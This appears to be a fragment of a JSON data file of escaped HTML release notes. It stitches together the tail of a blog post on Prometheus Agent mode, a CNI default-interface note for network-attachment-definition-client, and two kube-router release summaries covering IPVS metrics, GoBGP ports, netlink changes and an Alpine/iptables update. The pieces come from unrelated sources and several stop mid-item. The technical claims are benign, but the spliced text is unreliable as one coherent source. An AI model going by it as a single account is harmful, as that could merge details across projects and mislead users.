new-service-discovery-manager. See https://prometheus.io/docs/prometheus/latest/feature_flags/ for more details.\n</code></pre>\n<p>Since the Agent mode is behind a feature flag, as mentioned previously, use the <code>--enable-feature=agent</code> flag to run Prometheus in the Agent mode. Now, the rest of the flags are either for both server and Agent or only for a specific mode. You can see which flag is for which mode by checking the last sentence of a flag's help string. \"Use with server mode only\" means it's only for server mode. If you don't see any mention like this, it means the flag is shared.</p>\n<p>The Agent mode accepts the same scrape configuration with the same discovery options and remote write options.</p>\n<p>It also exposes a web UI with disabled query capabitilies, but showing build info, configuration, targets and service discovery information as in a normal Prometheus server.</p>\n<h3>Hands-on Prometheus Agent Example: Katacoda Tutorial</h3>\n<p>Similarly to Prometheus remote-write tutorial, if you would like to try the hands-on experience of Prometheus Agent capabilities, we recommend the <a href=\"https://katacoda.com/thanos/courses/thanos/4-receiver-agent\">Thanos Katacoda tutorial of Prometheus Agent</a>, which explains how easy it is to run Prometheus Agent.</p>\n<h2>Summary</h2>\n<p>I hope you found this interesting!

Containerd functionality is unchanged in that it uses the value for the IP addresses specifically</p>\n</blockquote>\n<blockquote>\n<p>It's worth noting that CNI ADD success results which do not contain any interfaces will be discarded in this determination of the default, therefore it's recommended to set one with an associated gateway if aiming to have it be noted as the default.</p>\n</blockquote>\n<p>See also:<br />\n<a href=\"https://github.com/k8snetworkplumbingwg/network-attachment-definition-client/releases/tag/v1.7.5\">https://github.com/k8snetworkplumbingwg/network-attachment-definition-client/releases/tag/v1.7.5</a> <a class=\"issue-link js-issue-link\" href=\"https://github.com/k8snetworkplumbingwg/network-attachment-definition-client/pull/73\">k8snetworkplumbingwg/network-attachment-definition-client#73</a></p>",

      "summary": "<h2>Summary</h2>\n<p>It has been more than half a year since our last official kube-router release, so I think we're more than past time to do so. Additionally, there have been quite a few items that have been fixed or upgraded.</p>\n<h3>Highlights &amp; Changed Functionality</h3>\n<ul>\n<li>The Network Services Controller (enabled via <code>--run-service-proxy</code>) now fetches metrics when the metrics URL is hit rather than on the sync period (<code>--ipvs-sync-period</code>). This allows for more fine-grained and up-to-date metrics on IPVS services. (Thanks <a class=\"user-mention notranslate\" href=\"https://github.com/rkojedzinszky\">@rkojedzinszky</a>!)</li>\n<li>Service's <code>externalIP</code> and <code>LoadBalancerIP</code> are now labels on IPVS metrics which can increase cardinality, but also provides better visibility for services. Prior to this, only the <code>ClusterIP</code> or <code>NodePort</code> labels were added to metrics.</li>\n<li>The GoBGP port can be changed or disabled via <code>--gpbgp-admin-port</code> to create more secure / flexible deployments of kube-router</li>\n<li>We converted a lot of exec's  out to <code>iproute2</code> into <code>netlink</code> library calls, making the code more idiomatic, faster, and less fragile to userspace tooling changes</li>\n<li>When both DSR and Maglev is enabled on a service kube-router will automatically enable the kernel option <code>sloppy_tcp</code> for IPVS which allows for greater service routing consistency when transitioning nodes (Thanks <a class=\"user-mention notranslate\" href=\"https://github.com/AnupamGhosh\">@AnupamGhosh</a>!)</li>\n<li>All references to Endpoints has been removed since the API is now fully deprecated and EndpointSlices is now used behind the scenes</li>\n</ul>\n<h3>Fixed Issues</h3>\n<ul>\n<li><a href=\"https://github.com/cloudnativelabs/kube-router/issues/1895\">1895</a> -

      "summary": "<h2>Summary</h2>\n<p>This update is mainly a dependency and docker image base update. For a long time, kube-router has been stalled on Alpine 3.18 because of a breaking change with the upstream iptables user space. However, this was fixed in <code>iptables-1.8.11</code> which was released in November and then was integrated into Alpine 3.21 early this Month. See <a class=\"issue-link js-issue-link\" href=\"https://github.com/cloudnativelabs/kube-router/issues/1789\">#1789</a> for more information.</p>\n<p>This should make kube-router much more tolerant of iptables / nftables rules added by recent versions of the netfilter userspaces.</p>\n<p>This release does contain a few prominent fixes since the last release of v2.4.1:</p>\n<ul>\n<li><code>ipset.Save()</code> was introduced at the start of the NetworkPolicyController resolving a race condition between the NetworkPolicyController (<code>--run-firewall</code>) and the NetworkServiceController (<code>--run-service-proxy</code>). See <a class=\"issue-link js-issue-link\" href=\"https://github.com/cloudnativelabs/kube-router/pull/1806\">#1806</a> (thanks <a class=\"user-mention notranslate\" href=\"https://github.com/alexcriss\">@alexcriss</a> for reporting this and being patient while we tried to reproduce)</li>\n<li>Internal cluster traffic is now properly excluded from NAT conditions which resolves a regression that was introduced in the v2.3 release line. See: <a class=\"issue-link js-issue-link\" href=\"https://github.com/cloudnativelabs/kube-router/issues/1778\">#1778</a> (thanks <a class=\"user-mention notranslate\" href=\"https://github.com/zerkms\">@zerkms</a> for reporting this)</li>\n</ul>\n<p>Other major dependency updates:</p>\n<ul>\n<li>Bundled CNI plugins have been updated from v1.4.0 -&gt; v1.6.2</li>\n<li>Go version has been updated from v1.22.3 -&gt; v1.23.6</li>\n</ul>\n<h2>Contributions</h2>\n<p>Special thanks to <a class=\"user-mention notranslate\" href=\"https://github.com/rbrtbnfgl\">@rbrtbnfgl</a> and <a class=\"user-mention notranslate\" href=\"https://github.com/dsseng\">@dsseng</a> for their contributions to this release!</p>\n<h2>Changelog</h2>\n<ul>\n<li><a class=\"commit-link\" href=\"https://github.com/cloudnativelabs/kube-router/commit/85e429e9c72b2bc7de93b5f1bcce20e7c924386d\"><tt>85e429e</tt></a> -
